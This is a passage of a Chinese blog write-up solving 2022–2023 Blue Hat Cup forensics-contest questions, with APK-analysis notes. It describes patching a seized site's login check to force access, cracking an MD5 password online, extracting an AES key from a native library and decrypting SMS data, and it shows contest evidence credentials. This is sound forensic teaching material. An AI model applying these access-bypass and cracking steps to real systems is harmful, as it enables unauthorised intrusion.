src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911205848607.png" alt="image-20230911205848607"></p><p>将<strong>账号不存在</strong>的结果改为登录成功，同时<strong>去除密码错误的判断</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911210605613.png" alt="image-20230911210605613"></p><p>发现页面报错连接不上数据库</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911212510974.png" alt="image-20230911212510974"></p><p>到环境配置文件中将数据库域名改为本地，密码也改为当前root密码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911212716694.png" alt="image-20230911212716694"></p><p>搜索嫌疑人账号即可找到推广人数</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911212914384.png" alt="image-20230911212914384"></p><h5 id="请给出涉案网站后台启用的超级管理员"><a href="#请给出涉案网站后台启用的超级管理员" class="headerlink" title="请给出涉案网站后台启用的超级管理员?"></a>请给出涉案网站后台启用的超级管理员?</h5><p>来到管理账号界面，可以查看当前启用的超级管理员</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911213131176.png" alt="image-20230911213131176"></p><h5 id="投资项目“贵州六盘水市风力发电基建工程”的日化收益为？"><a href="#投资项目“贵州六盘水市风力发电基建工程”的日化收益为？" class="headerlink" title="投资项目“贵州六盘水市风力发电基建工程”的日化收益为？"></a>投资项目“贵州六盘水市风力发电基建工程”的日化收益为？</h5><p>在<strong>项目管理</strong>这一部分查看</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/7-1693233460.png" alt="2023第七届蓝帽杯全国大学生网络安全技能大赛电子取证参考题解"></p><h5 id="最早访问涉案网站后台的IP地址为？"><a href="#最早访问涉案网站后台的IP地址为？" class="headerlink" title="最早访问涉案网站后台的IP地址为？"></a>最早访问涉案网站后台的IP地址为？</h5><p>在<strong>登录日志</strong>中查看</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/2-1693233461.png" alt="2023第七届蓝帽杯全国大学生网络安全技能大赛电子取证参考题解"></p><h5 id="分析涉案网站数据库或者后台VIP2的会员有多少个"><a href="#分析涉案网站数据库或者后台VIP2的会员有多少个" class="headerlink" title="分析涉案网站数据库或者后台VIP2的会员有多少个"></a>分析涉案网站数据库或者后台VIP2的会员有多少个</h5><p>在会员管理界面查找vip2会员数量</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911222736838.png" alt="image-20230911222736838"></p><h5 id="分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为"><a href="#分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为" class="headerlink" title="分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为"></a>分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为</h5><p>使用sql语句<code>SELECT * FROM member WHERE bankaddress LIKE &#39;%上海%&#39;</code>查询</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911223516705.png" alt="image-20230911223516705"></p><h5 id="分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？"><a href="#分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？" class="headerlink" title="分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？"></a>分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？</h5><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911223748483.png" alt="image-20230911223748483"></p><h5 id="分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？"><a href="#分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？" class="headerlink" title="分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？"></a>分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？</h5><p>该嫌疑人ID为513935</p><p>使用sql语句<code>SELECT COUNT(*) FROM member WHERE inviter = &#39;513935&#39;</code>查询</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911223339630-16944428199608.png" alt="image-20230911223339630"></p><h5 id="分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？"><a href="#分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？" class="headerlink" title="分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？"></a>分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？</h5><p>使用sql语句<code>SELECT COUNT(*) AS inviter_count, inviter FROM member GROUP BY inviter HAVING COUNT(*) &gt; 2;</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912125136474.png" alt="image-20230912125136474"></p><p>共60人下线超过2个</p><h5 id="分析涉案网站数据库或者后台网站内下线最多的代理真实名字为"><a href="#分析涉案网站数据库或者后台网站内下线最多的代理真实名字为" class="headerlink" title="分析涉案网站数据库或者后台网站内下线最多的代理真实名字为"></a>分析涉案网站数据库或者后台网站内下线最多的代理真实名字为</h5><p>给上题的语句加一个<code>order by inviter_count</code>进行排序</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912125123598.png" alt="image-20230912125123598"></p><p>最多的人的inviteid为618731，回到系统查询真实姓名即可</p><h5 id="分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱"><a href="#分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱" class="headerlink" title="分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱"></a>分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱</h5><p>使用数据库的账号密码登录<strong>phpMyAdmin</strong></p><p>发现资金明细表的名字为<strong>moneylog</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911232156194.png" alt="image-20230911232156194"></p><p>moneylog_status为’+’代表流入，为’-’代表流出，所以需要分开计算资金流入流出</p><p>使用sql语句<code>SELECT SUM(moneylog_money) FROM moneylog WHERE moneylog_status=&#39;+&#39;</code></p><p>和<code>SELECT SUM(moneylog_money) FROM moneylog WHERE moneylog_status=&#39;-&#39;</code></p><h3 id="蓝帽杯2022半决赛"><a href="#蓝帽杯2022半决赛" class="headerlink" title="蓝帽杯2022半决赛"></a>蓝帽杯2022半决赛</h3><h4 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证"></a>手机取证</h4><h5 id="iPhone手机的iBoot固件版本号"><a href="#iPhone手机的iBoot固件版本号" class="headerlink" title="iPhone手机的iBoot固件版本号:"></a>iPhone手机的iBoot固件版本号:</h5><p>使用盘古石手机取证分析系统</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912213655200.png" alt="image-20230912213655200"></p><h5 id="该手机制作完备份UTC-8的时间（非提取时间）"><a href="#该手机制作完备份UTC-8的时间（非提取时间）" class="headerlink" title="该手机制作完备份UTC+8的时间（非提取时间）:"></a>该手机制作完备份UTC+8的时间（非提取时间）:</h5><p>在数据文件下的<strong>数据库</strong>栏查看最后一个数据库备份生成的时间</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912214112466.png" alt="image-20230912214112466"></p><h4 id="exe分析"><a href="#exe分析" class="headerlink" title="exe分析"></a>exe分析</h4><h5 id="文件services-exe创建可执行文件的路径是"><a href="#文件services-exe创建可执行文件的路径是" class="headerlink" title="文件services.exe创建可执行文件的路径是:"></a>文件services.exe创建可执行文件的路径是:</h5><p>由于受害者检材除了手机镜像外没有其他文件</p><p>所以先<strong>从手机镜像恢复的聊天记录入手</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912215349289.png" alt="image-20230912215349289"></p><p>找到嫌疑软件，下载到本地</p><p><code>service.exe</code>就在压缩包中</p><p>传到奇安信情报沙箱<a href="https://sandbox.ti.qianxin.com/sandbox/page">奇安信情报沙箱 (qianxin.com)</a></p><p>在行为异常报告中得到可执行文件的路径</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912221000322.png" alt="image-20230912221000322"></p><h5 id="文件HackTool-FlyStudio-acz-unpack-exe是否调用了advapi32-dll动态函式链接库？"><a href="#文件HackTool-FlyStudio-acz-unpack-exe是否调用了advapi32-dll动态函式链接库？" class="headerlink" title="文件HackTool.FlyStudio.acz_unpack.exe是否调用了advapi32.dll动态函式链接库？"></a>文件HackTool.FlyStudio.acz_unpack.exe是否调用了advapi32.dll动态函式链接库？</h5><p>将文件拖入奇安信情报沙盒</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912221329428.png" alt="image-20230912221329428"></p><h5 id="文件aspnet-wp-v-exe执行后的启动的进程是什么"><a href="#文件aspnet-wp-v-exe执行后的启动的进程是什么" class="headerlink" title="文件aspnet_wp.v.exe执行后的启动的进程是什么:"></a>文件aspnet_wp.v.exe执行后的启动的进程是什么:</h5><p>将文件拖入奇安信情报沙盒</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912221602752.png" alt="image-20230912221602752"></p><h5 id="文件-4085034a23cccebefd374e4a77aea4f1-是什么类型的木马"><a href="#文件-4085034a23cccebefd374e4a77aea4f1-是什么类型的木马" class="headerlink" title="文件[4085034a23cccebefd374e4a77aea4f1]是什么类型的木马:"></a>文件[4085034a23cccebefd374e4a77aea4f1]是什么类型的木马:</h5><p>将文件拖入奇安信情报沙盒</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912221943419.png" alt="image-20230912221943419"></p><h5 id="文件-4085034a23cccebefd374e4a77aea4f1-网络连接的IP地址的归属地是哪个国家"><a href="#文件-4085034a23cccebefd374e4a77aea4f1-网络连接的IP地址的归属地是哪个国家" class="headerlink" title="文件[4085034a23cccebefd374e4a77aea4f1]网络连接的IP地址的归属地是哪个国家:"></a>文件[4085034a23cccebefd374e4a77aea4f1]网络连接的IP地址的归属地是哪个国家:</h5><p>将文件拖入<strong>微步云沙箱</strong></p><p>综合分析多个虚拟机上的网络行为，判断为<strong>韩国</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912222646165.png" alt="image-20230912222646165"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912222707735.png" alt="image-20230912222707735"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912222726172.png" alt="image-20230912222726172"></p><h4 id="apk分析-1"><a href="#apk分析-1" class="headerlink" title="apk分析"></a>apk分析</h4><h5 id="受害人手机中exec的序列号是"><a href="#受害人手机中exec的序列号是" class="headerlink" title="受害人手机中exec的序列号是:"></a>受害人手机中exec的序列号是:</h5><p>发现题目中给的安卓手机使用的是雷电模拟器的镜像格式</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912224610521.png" alt="image-20230912224610521"></p><p>使用<strong>雷电模拟器</strong>进行仿真</p><p>发现EXEC文件在其中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912230214531.png" alt="image-20230912230214531"></p><p>长按导出得到安装包</p><p>丢到<strong>雷电app智能分析</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912231603645.png" alt="image-20230912231603645"></p><h5 id="受害人手机中exec关联服务器地址是"><a href="#受害人手机中exec关联服务器地址是" class="headerlink" title="受害人手机中exec关联服务器地址是:"></a>受害人手机中exec关联服务器地址是:</h5><p>打开APP，得到服务器地址</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230913002901924.png" alt="image-20230913002901924"></p><h5 id="受害人手机中exec加载服务器的函数是"><a href="#受害人手机中exec加载服务器的函数是" class="headerlink" title="受害人手机中exec加载服务器的函数是:"></a>受害人手机中exec加载服务器的函数是:</h5><p>找到MainActivity类，发现启动时使用d.a.a.h</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230913092143906.png" alt="image-20230913092143906"></p><p>找到调用t()的函数</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230913092420847.png" alt="image-20230913092420847"></p><h5 id="受害人手机中exec的打包ID是"><a href="#受害人手机中exec的打包ID是" class="headerlink" title="受害人手机中exec的打包ID是:"></a>受害人手机中exec的打包ID是:</h5><p>在配置文件中</p><p>打包ID的字段一般会跟在包名之后</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230913093635896.png" alt="image-20230913093635896"></p><h5 id="受害人手机中exec的是否有安全检测行为？"><a href="#受害人手机中exec的是否有安全检测行为？" class="headerlink" title="受害人手机中exec的是否有安全检测行为？"></a>受害人手机中exec的是否有安全检测行为？</h5><p>一般app如果有安全检测行为，那么会在不合规后进行提醒</p><p>在jadx中暴搜“安全”即可</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230913130323570.png" alt="image-20230913130323570"></p><h5 id="受害人手机中exec的检测方法的完整路径和方法名是"><a href="#受害人手机中exec的检测方法的完整路径和方法名是" class="headerlink" title="受害人手机中exec的检测方法的完整路径和方法名是:"></a>受害人手机中exec的检测方法的完整路径和方法名是:</h5><p>查看刚刚暴搜到的文件，均通过<code>d.a.a.c.a.a()</code>方法来检测</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230913130421526.png" alt="image-20230913130421526"></p><h5 id="受害人手机中exec有几个界面"><a href="#受害人手机中exec有几个界面" class="headerlink" title="受害人手机中exec有几个界面:"></a>受害人手机中exec有几个界面:</h5><p>数Activity标签个数</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230913143117223.png" alt="image-20230913143117223"></p><h5 id="受害人手机中红星IPA的包名是"><a href="#受害人手机中红星IPA的包名是" class="headerlink" title="受害人手机中红星IPA的包名是:"></a>受害人手机中红星IPA的包名是:</h5><p>将3个模拟器镜像文件丢到<strong>盘古石手机取证分析系统</strong></p><p>暴搜<code>.ipa</code>后缀的文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914092159623.png" alt="image-20230914092159623"></p><p>将其导出</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914092223558.png" alt="image-20230914092223558"></p><p>红星.ipa改后缀为zip，然后解压，里面就有<strong>info.pslist</strong></p><p>ipa的包名一般是指<strong>BundleID</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914092849826.png" alt="image-20230914092849826"></p><h5 id="受害人手机中红星IPA的APIKEY是"><a href="#受害人手机中红星IPA的APIKEY是" class="headerlink" title="受害人手机中红星IPA的APIKEY是:"></a>受害人手机中红星IPA的APIKEY是:</h5><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914092805699.png" alt="image-20230914092805699"></p><h5 id="受害人手机中红星IPA的权限有哪些？"><a href="#受害人手机中红星IPA的权限有哪些？" class="headerlink" title="受害人手机中红星IPA的权限有哪些？"></a>受害人手机中红星IPA的权限有哪些？</h5><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914100842347.png" alt="image-20230914100842347"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914100859812.png" alt="image-20230914100859812"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914100915677.png" alt="image-20230914100915677"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914101028202.png" alt="image-20230914101028202"></p><h5 id="嫌疑人手机中红星APK的服务器地址是"><a href="#嫌疑人手机中红星APK的服务器地址是" class="headerlink" title="嫌疑人手机中红星APK的服务器地址是:"></a>嫌疑人手机中红星APK的服务器地址是:</h5><p>将红星安装到模拟器上，打开软件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914104718531.png" alt="image-20230914104718531"></p><h5 id="嫌疑人手机中红星APK的程序入口是"><a href="#嫌疑人手机中红星APK的程序入口是" class="headerlink" title="嫌疑人手机中红星APK的程序入口是:"></a>嫌疑人手机中红星APK的程序入口是:</h5><p>丢到雷电APP智能分析</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914104912163.png" alt="image-20230914104912163"></p><h5 id="嫌疑人手机中分析聊天工具，服务器的登录端口是"><a href="#嫌疑人手机中分析聊天工具，服务器的登录端口是" class="headerlink" title="嫌疑人手机中分析聊天工具，服务器的登录端口是:"></a>嫌疑人手机中分析聊天工具，服务器的登录端口是:</h5><p>打开聊天工具，点击右下角的聊天设置</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914105027156.png" alt="image-20230914105027156"></p><h5 id="嫌疑人手机中分析聊天工具，用户归属的机构是"><a href="#嫌疑人手机中分析聊天工具，用户归属的机构是" class="headerlink" title="嫌疑人手机中分析聊天工具，用户归属的机构是:"></a>嫌疑人手机中分析聊天工具，用户归属的机构是:</h5><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914105114806.png" alt="image-20230914105114806">ss</p><h5 id="结合手机流量分析聊天工具的登录账号和密码是"><a href="#结合手机流量分析聊天工具的登录账号和密码是" class="headerlink" title="结合手机流量分析聊天工具的登录账号和密码是:"></a>结合手机流量分析聊天工具的登录账号和密码是:</h5><p>使用<strong>Fiddler</strong>分析流量</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230914000443957.png" alt="image-20230914000443957"></p><p>找md5网站<a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a>破解密码</p><p>得到用户名:<code>17317289056</code> 密码:<code>b123456b</code></p><h3 id="蓝帽杯2023半决赛"><a href="#蓝帽杯2023半决赛" class="headerlink" title="蓝帽杯2023半决赛"></a>蓝帽杯2023半决赛</h3><h4 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证"></a>手机取证</h4><h5 id="检材数据开始提取是今年什么时候？"><a href="#检材数据开始提取是今年什么时候？" class="headerlink" title="检材数据开始提取是今年什么时候？"></a>检材数据开始提取是今年什么时候？</h5><p>导入手机分析系统</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230916093804638.png" alt="image-20230916093804638"></p><p>09-11 17:21</p><h5 id="嫌疑人手机SD卡存储空间一共多少GB？"><a href="#嫌疑人手机SD卡存储空间一共多少GB？" class="headerlink" title="嫌疑人手机SD卡存储空间一共多少GB？"></a>嫌疑人手机SD卡存储空间一共多少GB？</h5><p>丢到盘古石手机分析</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230916135113497.png" alt="image-20230916135113497"></p><p>24.32GB</p><h5 id="嫌疑人手机设备名称是？"><a href="#嫌疑人手机设备名称是？" class="headerlink" title="嫌疑人手机设备名称是？"></a>嫌疑人手机设备名称是？</h5><p>盘古石手机分析</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230916092906912.png" alt="image-20230916092906912"></p><p>sailfish</p><h5 id="嫌疑人手机IMEI是？"><a href="#嫌疑人手机IMEI是？" class="headerlink" title="嫌疑人手机IMEI是？"></a>嫌疑人手机IMEI是？</h5><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230916093912060.png" alt="image-20230916093912060"></p><p>352531082716257</p><h5 id="嫌疑人手机通讯录数据存放在那个数据库文件中？"><a href="#嫌疑人手机通讯录数据存放在那个数据库文件中？" class="headerlink" title="嫌疑人手机通讯录数据存放在那个数据库文件中？"></a>嫌疑人手机通讯录数据存放在那个数据库文件中？</h5><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230916095654847.png" alt="image-20230916095654847"></p><p>contacts.db</p><h5 id="嫌疑人手机一共使用过多少个应用？"><a href="#嫌疑人手机一共使用过多少个应用？" class="headerlink" title="嫌疑人手机一共使用过多少个应用？"></a>嫌疑人手机一共使用过多少个应用？</h5><p>这题没太搞懂出题人的意思</p><p>比赛的时候想的是计算有使用痕迹的应用</p><p>于是将应用日志导出，统计表格中使用时间不为空的格数，得到100</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230916100654390.png" alt="image-20230916100654390"></p><p>但答案是<strong>206</strong></p><p>我猜是把盘古石分析系统里分析出来的应用数量直接当作答案了</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918220528455.png" alt="image-20230918220528455"></p><h4 id="apk分析-2"><a href="#apk分析-2" class="headerlink" title="apk分析"></a>apk分析</h4><h5 id="测试apk的包名是？"><a href="#测试apk的包名是？" class="headerlink" title="测试apk的包名是？"></a>测试apk的包名是？</h5><p>将目标apk导出，丢到<strong>雷电APP智能分析</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918221932892.png" alt="image-20230918221932892"></p><p>com.example.myapplication</p><h5 id="测试apk的签名算法是？"><a href="#测试apk的签名算法是？" class="headerlink" title="测试apk的签名算法是？"></a>测试apk的签名算法是？</h5><p>使用<strong>jadx</strong>反编译apk</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918222558524.png" alt="image-20230918222558524"></p><p>SHA256withRSA</p><h5 id="测试apk的主入口是？"><a href="#测试apk的主入口是？" class="headerlink" title="测试apk的主入口是？"></a>测试apk的主入口是？</h5><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918222621086.png" alt="image-20230918222621086"></p><p>com.tencent.testvuln.MainActivity</p><h5 id="测试apk一共申请了几个权限？"><a href="#测试apk一共申请了几个权限？" class="headerlink" title="测试apk一共申请了几个权限？"></a>测试apk一共申请了几个权限？</h5><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918222721043.png" alt="image-20230918222721043"></p><p>3</p><h5 id="测试apk对Calllog-txt文件内的数据进行了什么加密？"><a href="#测试apk对Calllog-txt文件内的数据进行了什么加密？" class="headerlink" title="测试apk对Calllog.txt文件内的数据进行了什么加密？"></a>测试apk对Calllog.txt文件内的数据进行了什么加密？</h5><p>将callog.txt导出后尝试解密，发现是Base64编码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230916103845439.png" alt="image-20230916103845439"></p><p>base64</p><h5 id="10086对嫌疑人拨打过几次电话？"><a href="#10086对嫌疑人拨打过几次电话？" class="headerlink" title="10086对嫌疑人拨打过几次电话？"></a>10086对嫌疑人拨打过几次电话？</h5><p>分析解码后的callout文件，10086一共打进过2次</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230916104131281.png" alt="image-20230916104131281"></p><p>2</p><h5 id="测试apk对短信记录进行了几次加密？"><a href="#测试apk对短信记录进行了几次加密？" class="headerlink" title="测试apk对短信记录进行了几次加密？"></a>测试apk对短信记录进行了几次加密？</h5><p>找到短信记录SMS.txt</p><p>现在分析apk中的加密方式</p><p>用jadx反编译</p><p>分析主入口，找到短信加密的部分</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918222911500.png" alt="image-20230918222911500"></p><p>encryptData</p><p>使用了AES+Base64的加密方式</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918223027781.png" alt="image-20230918223027781"></p><p>所以是<strong>2层</strong>加密</p><h5 id="测试apk对短信记录进行加密的秘钥是？"><a href="#测试apk对短信记录进行加密的秘钥是？" class="headerlink" title="测试apk对短信记录进行加密的秘钥是？"></a>测试apk对短信记录进行加密的秘钥是？</h5><p>密钥是通过Getkey()函数得到</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918223127609.png" alt="image-20230918223127609"></p><p>发现使用的静态文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918223255414.png" alt="image-20230918223255414"></p><p>使用ida解析<strong>so文件</strong></p><p>搜索到Getkey函数</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918224254514.png" alt="image-20230918224254514"></p><p>生成的key由first变量得到</p><p>且对其进行base64编码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918224545981.png" alt="image-20230918224545981"></p><p><strong>first</strong>值为<code>lijubdyhfurindhcbxdw</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918224636131.png" alt="image-20230918224636131"></p><p>base编码后取前16位</p><p>key为<code>bGlqdWJkeWhmdXJp</code></p><h5 id="嫌疑人在2021年登录支付宝的验证码是？"><a href="#嫌疑人在2021年登录支付宝的验证码是？" class="headerlink" title="嫌疑人在2021年登录支付宝的验证码是？"></a>嫌疑人在2021年登录支付宝的验证码是？</h5><p>使用得到的key对base64解码后的SMS.txt进行AES解密</p><p>得到原文</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918225232527.png" alt="image-20230918225232527"></p><p>验证码为<strong>9250</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230918225315750.png" alt="image-20230918225315750"></p><h2 id="电子取证解题经验"><a href="#电子取证解题经验" class="headerlink" title="电子取证解题经验"></a>电子取证解题经验</h2><h3 id="apk取证"><a href="#apk取证" class="headerlink" title="apk取证"></a>apk取证</h3><h4 id="apk文件结构"><a href="#apk文件结构" class="headerlink" title="apk文件结构"></a>apk文件结构</h4><div class="table-container"><table><thead><tr><th>文件名</th><th>作用</th></tr></thead><tbody><tr><td>Asset 文件夹</td><td>存放需要打包到APK中的静态文件</td></tr><tr><td>Lib文件夹</td><td>程序依赖的native库</td></tr><tr><td>META-INF文件夹</td><td>签名信息（安装验证）</td></tr><tr><td>Res文件夹</td><td>资源文件夹</td></tr><tr><td>AndroidManifest.xml</td><td>应用程序的配置文件</td></tr><tr><td>classes.dex</td><td>可执行文件（java代码编译后）可以使用jadx反编译为源码</td></tr><tr><td>Resources.arsc</td><td>资源列表</td></tr></tbody></table></div><h4 id="从手机模拟器中导出apk文件"><a href="#从手机模拟器中导出apk文件" class="headerlink" title="从手机模拟器中导出apk文件"></a>从手机模拟器中导出apk文件</h4><p>这里以<strong>雷电模拟器</strong>为例</p><p>按住桌面上的应用，托向左边的导出即可</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912231142077.png" alt="image-20230912231142077"></p><h4 id="包名"><a href="#包名" class="headerlink" title="包名"></a>包名</h4><div class="note info flat"><p><strong>包名(Package Name)</strong>作为应用的唯一标识。即：包名必须唯一，一个包名代表一个应用，不允许两个应用使用同样的包名。</p><p>android系统使用包名(package name)来判定应用程序的同一性，但是由于包名可以由开发者自由设置，为了保护应用程序不被其他开发者开发的同包名应用覆盖，用于发布的Android应用程序需要加上开发者签名。</p><p><strong>包（packages）</strong>: 采用反写域名命名规则，即<code>com.xx.xxx.xxxx</code>形式</p><p>全部使用小写字母。一级包名为com，二级包名为xx（一般为公司或个人域名），三级包名根据应用进行命名，四级包名为功能模块名。如：<code>com.tencent.qq.activitys</code>，这样具备较高可读性，一看就知道是腾讯公司QQ软件中存放activity的包。</p></div><p>取证题目中问到apk的包名，即问应用的唯一标识，一般存放于AndroidManifest.xml</p><p><strong>分析工具</strong></p><ol><li><p><strong>APK Messenger</strong></p><p>将apk文件拖入APK Messenger后会自动显示包名</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905103912013.png" alt="image-20230905103912013"></p></li></ol><ol><li><p><strong>MobSF</strong>（启动时最好打开梯子，因为要检查更新）</p><p>在apk检查报告中，同样会显示包名</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905105042200.png" alt="image-20230905105042200"></p></li><li><p><strong>雷电APP智能分析</strong></p><p>在<strong>基本信息</strong>栏中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230912231755590.png" alt="image-20230912231755590"></p></li></ol><h4 id="打包ID"><a href="#打包ID" class="headerlink" title="打包ID"></a>打包ID</h4><p>在配置文件<strong>AndroidManifest.xml</strong>中，打包ID一般跟在apk的包名之后</p><p>使用jadx暴搜即可</p><h4 id="打包时间"><a href="#打包时间" class="headerlink" title="打包时间"></a>打包时间</h4><p><strong>分析工具</strong></p><p><strong>APK Messenger</strong></p><p>将apk文件拖入APK Messenger后，可以查看apk打包时间</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905232026881.png" alt="image-20230905232026881"></p><h4 id="签名序列号"><a href="#签名序列号" class="headerlink" title="签名序列号"></a>签名序列号</h4><p>签名信息一般隐藏在<code>META-INF</code>目录下的RSA文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905113728668.png" alt="image-20230905113728668"></p><p>使用工具可以直观地查看签名序列号</p><p><strong>分析工具</strong></p><ol><li><p><strong>MobSF</strong>（启动时最好打开梯子，因为要检查更新）</p><p>使用工具<strong>MobSF</strong>分析apk数据包，签名序列号为报告中<strong>SIGNER CERTIFICATE</strong>模块的<strong>Serial Number</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905105427472.png" alt="image-20230905105427472"></p></li><li><p><strong>jadx</strong></p><p>使用工具jadx反编译apk安装包，可以在<strong>APK signature报告</strong>中找到签名序列号</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905114444521.png" 